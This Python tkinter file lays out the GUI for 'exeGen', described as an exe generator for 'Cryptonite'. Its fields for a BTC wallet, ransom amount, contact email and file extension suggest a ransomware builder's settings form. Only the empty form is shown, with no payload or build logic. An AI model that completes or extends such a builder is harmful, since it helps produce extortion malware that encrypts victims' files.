import tkinter as tk
from tkinter import ttk
from tkinter.filedialog import askdirectory

window = tk.Tk()
window.rowconfigure([0,1,2,3,4,5], minsize = 1, weight = 0)
window.resizable(0,0)
window.columnconfigure(0, minsize = 1, weight = 0)
window.columnconfigure(1, minsize = 1, weight = 0)

s = ttk.Style()
# s.configure("")

title = tk.Label(master = window, text = "exeGen: Official exe generator for Cryptonite", font = ("arial", 30))
title.grid(row = 0, column = 0, columnspan = 2, pady = 20, padx = 15)

url = tk.Label(master = window, text = "URL: ", font = ("arial", 15))
url.grid(row = 1, column = 0, sticky = "e", pady = 20, padx = 15)
url_entry = tk.Entry(window, font = ("arial", 15))
url_entry.grid(row = 1, column = 1, sticky = "w", pady = 20, padx = 15)

btcw = tk.Label(master = window, text = "BTC WALLET ADDRESS: ", font = ("arial", 15))
btcw.grid(row = 2, column = 0, sticky = "e", pady = 20, padx = 15)
btcw_entry = tk.Entry(window, font = ("arial", 15))
btcw_entry.grid(row = 2, column = 1, sticky = "w", pady = 20, padx = 15)

btcm = tk.Label(master = window, text = "BTC AMOUNT: ", font = ("arial", 15))
btcm.grid(row = 3, column = 0, sticky = "e", pady = 20, padx = 15)
btcm_entry = tk.Entry(window, font = ("arial", 15))
btcm_entry.grid(row = 3, column = 1, sticky = "w", pady = 20, padx = 15)

email = tk.Label(master = window, text = "EMAIL (not original): ", font = ("arial", 15))
email.grid(row = 4, column = 0, sticky = "e", pady = 20, padx = 15)
email_entry = tk.Entry(window, font = ("arial", 15))
email_entry.grid(row = 4, column = 1, sticky = "w", pady = 20, padx = 15)

ext = tk.Label(master = window, text = "EXTENSION: ", font = ("arial", 15))
ext.grid(row = 5, column = 0, sticky = "e", pady = 20, padx = 15)
ext_entry = tk.Entry(window, font = ("arial", 15))
ext_entry.grid(row = 5, column = 1, sticky = "w", pady = 20, padx = 15)



window.mainloop()